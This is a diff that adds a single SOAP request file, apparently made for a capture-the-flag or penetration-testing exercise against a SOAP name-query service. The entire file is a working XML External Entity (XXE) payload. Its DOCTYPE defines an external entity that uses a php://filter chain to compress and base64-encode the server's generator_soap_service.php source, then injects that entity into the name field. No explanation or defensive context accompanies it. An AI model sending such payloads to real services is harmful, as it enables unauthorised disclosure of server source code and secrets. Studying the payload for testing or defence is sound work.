@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/generator_soap_service.php"> ]>
+<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope" xmlns:ns1="http://www.sentor.se/soap-multiservice" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:enc="http://www.w3.org/2003/05/soap-encoding"><env:Body><ns1:nameQuery env:encodingStyle="http://www.w3.org/2003/05/soap-encoding">
+<ns1:name xsi:type="xsd:string">&example;</ns1:name>
+</ns1:nameQuery>
+</env:Body></env:Envelope>
